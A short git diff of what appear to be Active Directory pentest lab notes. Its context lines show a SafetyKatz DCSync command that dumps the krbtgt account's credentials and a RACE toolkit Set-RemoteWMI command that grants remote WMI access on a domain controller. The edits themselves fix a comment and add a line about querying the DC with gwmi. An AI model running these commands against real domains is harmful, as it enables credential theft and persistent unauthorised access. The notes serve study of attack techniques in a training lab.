@@ -603,7 +603,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 
 ```powershell
-# First of all run to -:
+# First of all run (to import RACE Toolikit) -:
 
 C:\AD\Tools\RACE-master\RACE.ps1
 
@@ -627,4 +627,8 @@ Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\ci
 
 **Example**
 
-- After running the 
+- After running the 2nd payload as shown above we can use `gwmi` to check for information on the DC
+
+
+![](https://i.imgur.com/WNWRJR1.png)
+
